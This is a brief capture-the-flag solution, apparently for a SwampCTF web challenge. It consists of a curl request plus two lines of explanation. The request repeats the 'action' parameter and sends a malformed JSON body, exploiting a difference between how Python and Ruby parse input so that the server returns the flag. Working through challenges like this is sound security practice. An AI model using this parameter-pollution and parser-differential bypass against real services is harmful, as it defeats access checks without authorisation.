curl -i -X POST "http://chals.swampctf.com:41234/api?action=getFlag&action=getInfo" \
  -H "Content-Type: application/json" \
  -d '{"key": "\x"}'


The challenge is using action param 2 times to bypass check in ruby application.
Also use a json payload which errors in python but not in ruby.
